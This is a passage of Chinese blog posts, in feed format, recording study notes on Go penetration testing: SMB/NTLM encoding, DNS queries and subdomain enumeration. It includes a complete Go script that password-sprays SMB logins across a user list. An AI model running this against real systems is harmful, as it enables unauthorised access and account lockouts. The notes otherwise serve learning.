class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">l, err := getOffsetByFieldName(fieldName, meta)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">data = <span class="type">uint16</span>(l)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := binary.Write(w, binary.LittleEndian, data); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> reflect.Uint32:</span><br><span class="line">data := valuev.Interface().(<span class="type">uint32</span>)</span><br><span class="line"><span class="keyword">if</span> meta != <span class="literal">nil</span> &amp;&amp; meta.Tags.Has(<span class="string">&quot;len&quot;</span>) &#123;</span><br><span class="line">fieldName, err := meta.Tags.GetString(<span class="string">&quot;len&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">l, err := getFieldLengthByName(fieldName, meta)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">data = <span class="type">uint32</span>(l)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> meta != <span class="literal">nil</span> &amp;&amp; meta.Tags.Has(<span class="string">&quot;offset&quot;</span>) &#123;</span><br><span class="line">fieldName, err := meta.Tags.GetString(<span class="string">&quot;offset&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">l, err := getOffsetByFieldName(fieldName, meta)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">data = <span class="type">uint32</span>(l)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := binary.Write(w, binary.LittleEndian, data); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> reflect.Uint64:</span><br><span class="line"><span class="keyword">if</span> err := binary.Write(w, binary.LittleEndian, valuev.Interface().(<span class="type">uint64</span>)); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, errors.New(fmt.Sprintf(<span class="string">&quot;Marshal not implemented for kind: %s&quot;</span>, typev.Kind()))</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> w.Bytes(), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="3-强制ASN-1编码"><a href="#3-强制ASN-1编码" class="headerlink" title="3. 强制ASN.1编码"></a>3. 强制<code>ASN.1</code>编码</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(n *NegTokenInit)</span></span> MarshalBinary(meta *encoder.Metadata) ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;</span><br><span class="line">buf, err := asn1.Marshal(*n)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用<code>asn1.Marshal(*n)</code>适合 go 可以和 asn.1编码与SMB规范定义的基本数据格式配合使用</p><h4 id="4-了解元数据和引用字段"><a href="#4-了解元数据和引用字段" class="headerlink" title="4. 了解元数据和引用字段"></a>4. 了解元数据和引用字段</h4><p>SMB规范中可以知道：从协商响应消息端中获取的字段指的是包含实际值的可变长度字节切片的偏移量和长度</p><p><code>SecurityBufferOffset(两个字节)</code>：从SMB2标头开始到安全缓冲区的偏移量(以字节为单位)</p><p><code>SecurityBufferLength(两个字节)：</code>从安全缓冲区的长度</p><h4 id="5-SMB的实现"><a href="#5-SMB的实现" class="headerlink" title="5. SMB的实现"></a>5. SMB的实现</h4><p>这里略过，因为我看不懂</p><h2 id="0x03-使用SMB包猜测密码"><a href="#0x03-使用SMB包猜测密码" class="headerlink" title="0x03 使用SMB包猜测密码"></a>0x03 使用SMB包猜测密码</h2><p>现在我们来试一下利用<code>SMB</code>包实施在线密码猜解，我们先下载smb包</p><p><code>go get github.com/blackhat-go/bhg/ch-6/smb/smb</code></p><p>接下来编写代码，接受保存换行符分割的用户名，密码，域和目标主体，为了避免将账户锁定在某些域之外，我们将尝试对一个用户列表使用同一个密码，而不是对一个或多个用户使用密码列表。</p><blockquote><p>在线密码猜测可以将账户锁定在域之外，从而有效的实施拒绝服务攻击，测试时务必谨慎。</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;bytes&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;github.com/blackhat-go/bhg/ch-6/smb/smb&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(os.Args) != <span class="number">5</span> &#123;</span><br><span class="line">log.Fatalln(<span class="string">&quot;Usage: main &lt;/user/file&gt; &lt;password&gt; &lt;domain&gt; &lt;target_host&gt;&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">buf, err := ioutil.ReadFile(os.Args[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line">options := smb.Options&#123;</span><br><span class="line">Password: os.Args[<span class="number">2</span>],</span><br><span class="line">Domain:   os.Args[<span class="number">3</span>],</span><br><span class="line">Host:     os.Args[<span class="number">4</span>],</span><br><span class="line">Port:     <span class="number">445</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">users := bytes.Split(buf, []<span class="type">byte</span>&#123;<span class="string">&#x27;\n&#x27;</span>&#125;)</span><br><span class="line"><span class="keyword">for</span> _, user := <span class="keyword">range</span> users &#123;</span><br><span class="line">options.User = <span class="type">string</span>(user)</span><br><span class="line">session, err := smb.NewSession(options, <span class="literal">false</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;[-] Login failed: %s\\%s [%s]\n&quot;</span>,</span><br><span class="line">options.Domain,</span><br><span class="line">options.User,</span><br><span class="line">options.Password)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> session.Close()</span><br><span class="line"><span class="keyword">if</span> session.IsAuthenticated &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;[+] Success     : %s\\%s [%s]\n&quot;</span>,</span><br><span class="line">options.Domain,</span><br><span class="line">options.User,</span><br><span class="line">options.Password)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x04-通过pass-the-hash重用密码"><a href="#0x04-通过pass-the-hash重用密码" class="headerlink" title="0x04 通过pass the hash重用密码"></a>0x04 通过pass the hash重用密码</h2><p>先搁一下，学内网的时候在返回来看。</p>]]></content>
    
    
    <summary type="html">与SMB和NTLM交互</summary>
    
    
    
    <category term="Go渗透测试" scheme="https://h0ld1rs.github.io/categories/Go%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="Golang,渗透测试" scheme="https://h0ld1rs.github.io/tags/Golang-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Go渗透测试笔记(五)</title>
    <link href="https://h0ld1rs.github.io/posts/12296.html"/>
    <id>https://h0ld1rs.github.io/posts/12296.html</id>
    <published>2022-03-04T10:17:05.000Z</published>
    <updated>2022-03-05T03:19:41.496Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Go渗透测试笔记-五-–DNS的利用"><a href="#Go渗透测试笔记-五-–DNS的利用" class="headerlink" title="Go渗透测试笔记(五)–DNS的利用"></a>Go渗透测试笔记(五)–DNS的利用</h1><h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a>0X00 前言</h2><p>DNS用于定位Internet，并将其转化为IP地址。他可以成为攻击者手段的有效武器。因为组织通常允许协议的出站连接离开受限制的网络，并且无法充分监视其使用。</p><h2 id="0x01-编写DNS客户端"><a href="#0x01-编写DNS客户端" class="headerlink" title="0x01 编写DNS客户端"></a>0x01 编写DNS客户端</h2><p>Go本质上可以用内置的包<code>net</code>，支持大多数的<code>DNS</code>类型，内置包的好处在于<code>简单易用的API</code>，例如<code>LookupAddr(addr string)</code>返回给定IP地址的主机名列表，但是使用内置包也有缺点:<code>无法指定目标服务器</code>，不过，该包会使用操作系统配置的解析器。另一个缺点是：<code>无法对结果进行深入检查</code></p><p>为了解决这个问题，我们使用一个优秀的由<code>Miek Gieben</code>编写的第三方包，即<code>Go DNS</code>包</p><p>同样，安装命令如下：</p><p><code>go get github.com/miekg/dns</code></p><h3 id="1-检索A记录"><a href="#1-检索A记录" class="headerlink" title="1. 检索A记录"></a>1. 检索A记录</h3><p>编写如下代码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;github.com/miekg/dns&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line"><span class="keyword">var</span> msg dns.Msg</span><br><span class="line">fqdn := dns.Fqdn(<span class="string">&quot;baidu.com&quot;</span>)</span><br><span class="line">msg.SetQuestion(fqdn,dns.TypeA)</span><br><span class="line">dns.Exchange(&amp;msg,<span class="string">&quot;8.8.8.8:53&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>FQDN 完全限定域名，该域名指定主机在DNS结构中的精确位置，然后使用一种成为<code>A</code>记录的DNS记录，将该<code>FQDN</code>地址解析为IP地址。</p></blockquote><p>首先，创建一个信的Msg，然后将域转换为可以与DNS服务器交换的FQDN。接下来使用<code>TypeA</code>代表查找A记录</p><p>这里DNS服务器涉及到一个问题</p><blockquote><p> DNS解析中的A记录、AAAA记录、CNAME记录、MX记录、NS记录、TXT记录、SRV记录、URL转发等 </p><p> <strong>A</strong>记录： 将域名指向一个IPv4地址（例如：100.100.100.100），需要增加A记录</p><p> NS记录： 域名解析服务器记录，如果要将子域名指定某个域名服务器来解析，需要设置NS记录</p><p> SOA记录： SOA叫做起始授权机构记录，NS用于标识多台域名解析服务器，SOA记录用于在众多NS记录中标记哪一台是主服务器</p><p> MX记录： 建立电子邮箱服务，将指向邮件服务器地址，需要设置MX记录。建立邮箱时，一般会根据邮箱服务商提供的MX记录填写此记录</p><p> TXT记录： 可任意填写，可为空。一般做一些验证记录时会使用此项，如：做SPF（反垃圾邮件）记录</p></blockquote><p>然后，调用<code>Exchange(*Msg,string)</code>，将消息发送到提供的服务器地址，在本例中使用的是<code>Goole的DNS服务器地址</code></p><p>接下来，我们使用<code>wirshark</code>进行数据包的分析</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220304190141.png"></p><p>会得到如下的数据，通过捕获的数据包，我们可以看到通过<code>UDP</code>53与<code>8.8.8.8</code>端口连接，还可以看到与<code>DNS</code>信息有关的部分</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220304190320.png"></p><p>可以看到在请求<code>DNS</code>A记录的同时，将查询先发送给8.8.8.8，然后再从8.8.8.8返回，包含以及解析的IP地址,<code>220.181.38.251</code></p><h3 id="2-使用Msg结构体处理应答"><a href="#2-使用Msg结构体处理应答" class="headerlink" title="2. 使用Msg结构体处理应答"></a>2. 使用<code>Msg</code>结构体处理应答</h3><p>从<code>Exchange(*Msg,string)</code>返回的值是<code>(*Msg error)</code>，返回的错误类型是可以接受的，那，为什么返回了(*Msg)呢？</p><p>先看一下<code>Msg</code>的定义</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Msg <span class="keyword">struct</span> &#123;</span><br><span class="line">MsgHdr</span><br><span class="line">Compress <span class="type">bool</span>       <span class="string">`json:&quot;-&quot;`</span> <span class="comment">// If true, the message will be compressed when converted to wire format.</span></span><br><span class="line">Question []Question <span class="comment">// Holds the RR(s) of the question section.</span></span><br><span class="line">Answer   []RR       <span class="comment">// Holds the RR(s) of the answer section.</span></span><br><span class="line">Ns       []RR       <span class="comment">// Holds the RR(s) of the authority section.</span></span><br><span class="line">Extra    []RR       <span class="comment">// Holds the RR(s) of the additional section.</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结构体包含问询和应答，这使得我们可以将所有<code>DNS</code>合并为一个统一的结构体，结构体<code>Msg</code>拥有多种处理起来也更为容易的方法。</p><p>例如，我么可以使用<code>SetQuestion()</code>修改切片<code>Question</code>，也可以使用方法<code>append()</code>直接修改此切片,可以获得相同的结果。切片<code>Answer</code>，保存查询的情况，其类型为<code>RR</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/miekg/dns&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> msg dns.Msg</span><br><span class="line">fqdn := dns.Fqdn(<span class="string">&quot;baidu.com&quot;</span>)</span><br><span class="line">msg.SetQuestion(fqdn,dns.TypeA)</span><br><span class="line">in ,err := dns.Exchange(&amp;msg,<span class="string">&quot;8.8.8.8:53&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(in.Answer) &lt; <span class="number">1</span>&#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;No records&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _,answer := <span class="keyword">range</span> in.Answer&#123;</span><br><span class="line"><span class="keyword">if</span> a, ok := answer.(*dns.A); ok &#123;</span><br><span class="line">fmt.Println(a.A)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先，从储存的<code>Exchange</code>返回的值，是否存在错误，则调用<code>panic</code>停止程序。可以快速确定堆栈跟踪，并确定错误发生的位置。接下来，先确认<code>Answer</code>的长度至少为1，如果不是，则表明没有记录，则立即返回。毕竟在某些情况下，域名无法解析。</p><p>类型<code>RR</code>，是一个具有两个方法的接口，并且都不允许访问应答中存储的<code>IP</code>地址，要访问这些地址，需要执行类型声明以将<code>数据实例</code>创建为所需要的类型。首先遍历所有应答，然后，对应答类型进行断言。以确保我们正在处理的类型全部是<code>*dns.A</code>的类型。</p><h3 id="3-枚举子域"><a href="#3-枚举子域" class="headerlink" title="3. 枚举子域"></a>3. 枚举子域</h3><p>现在已经可以使用<code>Go</code>创建一个DNS客户端了，在本节中，我们创建一个枚举的子域的工具。</p><p>当我们开始编写工具的时候，必须确定工具使用了那些参数，我们要写的工具参数，包括目标域，包含要猜测的子域文件名，要使用的DNS服务器以及要启动的工作程序数量。Go提供了一个有用的<code>flag</code>包，我们将使用这个包去处理命令参数。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span>(</span><br><span class="line">flDomain = flag.String(<span class="string">&quot;domain&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;要猜解的域名&quot;</span>)</span><br><span class="line">flWordlist = flag.String(<span class="string">&quot;wordlist&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;猜解所使用的字典&quot;</span>)</span><br><span class="line">flWorkerCount = flag.Int(<span class="string">&quot;c&quot;</span>,<span class="number">100</span>,<span class="string">&quot;所使用的线程&quot;</span>)</span><br><span class="line">flServerAddr = flag.String(<span class="string">&quot;Server&quot;</span>,<span class="string">&quot;8.8.8.8:53&quot;</span>,<span class="string">&quot;所使用的DNS服务器&quot;</span>)</span><br><span class="line">)</span><br><span class="line">flag.Parse()</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这种方式违反了    <code>Unix</code>法则，因为它定义了一些非可选的参数，当然此处也可以使用<code>os.Args</code>，但是使用<code>flag</code>包能更好的便捷理解</p></blockquote><p>但是，此时的程序时不能编译通过的，我们会收到使用未知变量的错误。我们需要加入以下代码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> *flDomain == <span class="string">&quot;&quot;</span> || *flWordlist == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;-domain and -wordlist are required&quot;</span>)</span><br><span class="line">os.Exit(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了我们的工具可以输出解析的域名以及各自的IP，我们将创建一个结构类型来储存此信息。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> result <span class="keyword">struct</span> &#123;</span><br><span class="line">IPAddress <span class="type">string</span></span><br><span class="line">Hostname  <span class="type">string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此工具查询的两种主要的记录类型：A和<code>CNAME</code>，我们将使用单独的函数执行每个查询，每个函数只执行一种操作。</p><blockquote><p>(Canonical Name)记录，(alias from one domain name to another)通常称别名指向 。<br>通俗点讲就是给你的域名起一个别名。比如你的域名是<a href="http://www.abc.com，想和你的另外一个域名www.cba.com进行绑定，应该在cname的host中填入www，在points中填入www.cba.com。这样一来当你访问www.abc.com的时候自动跳转到www.cba.com，而且浏览器上显示的域名仍然是www.abc.com。看了这个你可能会混淆解析和绑定的区别，很多站长认为将一个域名（www.abc.com）cname到另外一个域名（www.cba.com)之后就可以实现:访问www.abc.com得到www.cba.com的内容">www.abc.com，想和你的另外一个域名www.cba.com进行绑定，应该在cname的host中填入www，在points中填入www.cba.com。这样一来当你访问www.abc.com的时候自动跳转到www.cba.com，而且浏览器上显示的域名仍然是www.abc.com。看了这个你可能会混淆解析和绑定的区别，很多站长认为将一个域名（www.abc.com）cname到另外一个域名（www.cba.com)之后就可以实现:访问www.abc.com得到www.cba.com的内容</a>.<br>把cName和转向功能混为一谈了。cName只能保证<a href="http://www.abc.com的解析和www.cba.com同步起来,如果是共享ip的主机,不绑定还是访问不到网站内容.这就是为什么如果你设置cname到你的新浪sae域名,如果sae没有将你和他绑定你还是访问不了他的原因./">www.abc.com的解析和www.cba.com同步起来，如果是共享ip的主机，不绑定还是访问不到网站内容。这就是为什么如果你设置cname到你的新浪sae域名，如果sae没有将你和他绑定你还是访问不了他的原因。</a></p></blockquote><h3 id="4-查询A记录和CNAME记录"><a href="#4-查询A记录和CNAME记录" class="headerlink" title="4. 查询A记录和CNAME记录"></a>4. 查询A记录和CNAME记录</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">lookupA</span><span class="params">(fqdn, serverAddr <span class="type">string</span>)</span></span> ([]<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">var</span> m dns.Msg</span><br><span class="line"><span class="keyword">var</span> ips []<span class="type">string</span></span><br><span class="line">m.SetQuestion(dns.Fqdn(fqdn), dns.TypeA)</span><br><span class="line">in, err := dns.Exchange(&amp;m, serverAddr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> ips, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(in.Answer) &lt; <span class="number">1</span> &#123;</span><br><span class="line"><span class="keyword">return</span> ips, errors.New(<span class="string">&quot;no answer&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, answer := <span class="keyword">range</span> in.Answer &#123;</span><br><span class="line"><span class="keyword">if</span> a, ok := answer.(*dns.A); ok &#123;</span><br><span class="line">ips = <span class="built_in">append</span>(ips, a.A.String())</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ips, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">lookupCNAME</span><span class="params">(fqdn, serverAddr <span class="type">string</span>)</span></span> ([]<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">var</span> m dns.Msg</span><br><span class="line"><span class="keyword">var</span> fqdns []<span class="type">string</span></span><br><span class="line">m.SetQuestion(dns.Fqdn(fqdn), dns.TypeCNAME)</span><br><span class="line">in, err := dns.Exchange(&amp;m, serverAddr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fqdns, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(in.Answer) &lt; <span class="number">1</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fqdns, errors.New(<span class="string">&quot;no answer&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, answer := <span class="keyword">range</span> in.Answer &#123;</span><br><span class="line"><span class="keyword">if</span> c, ok := answer.(*dns.CNAME); ok &#123;</span><br><span class="line">fqdns = <span class="built_in">append</span>(fqdns, c.Target)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> fqdns, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>CNAME 记录一个FQDN指向另一个FQDN作为自己的别名。假如<code>example.com</code>组织的所有者希望通过wordpress托管来托管 wordpress网站。该服务可能有上百种ip，用于平衡其所有用户的站点，因此不可能提供单个的IP地址。wordpress可能为<code>example.com</code>提供一个CNAME，因此，<code>example.com</code>的<code>CNAME</code>可能指向<code>someserver.hostingcompany.org</code>，而CNAME的A记录则指向一个IP地址，这允许<code>example.com</code>的所有者将其站点托管再没有IP信息的服务器上面。</p><p>因此，我们需要追踪CNAME的痕迹，才能找到最有效的A记录。</p></blockquote><p>接下来我们定义lookup方法来使用CNAME追踪A记录</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">lookup</span><span class="params">(fqdn, serverAddr <span class="type">string</span>)</span></span> []result &#123;</span><br><span class="line"><span class="keyword">var</span> results []result</span><br><span class="line"><span class="keyword">var</span> cfqdn = fqdn <span class="comment">// Don&#x27;t modify the original.</span></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">cnames, err := lookupCNAME(cfqdn, serverAddr)</span><br><span class="line"><span class="keyword">if</span> err == <span class="literal">nil</span> &amp;&amp; <span class="built_in">len</span>(cnames) &gt; <span class="number">0</span> &#123;</span><br><span class="line">cfqdn = cnames[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">continue</span> <span class="comment">// We have to process the next CNAME.</span></span><br><span class="line">&#125;</span><br><span class="line">ips, err := lookupA(cfqdn, serverAddr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">break</span> <span class="comment">// There are no A records for this hostname.</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, ip := <span class="keyword">range</span> ips &#123;</span><br><span class="line">results = <span class="built_in">append</span>(results, result&#123;IPAddress: ip, Hostname: fqdn&#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span> <span class="comment">// We have processed all the results.</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> results</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过循环一直找到解析的末尾，从而跟踪CNAME的痕迹。</p><h3 id="5-工人函数"><a href="#5-工人函数" class="headerlink" title="5. 工人函数"></a>5. 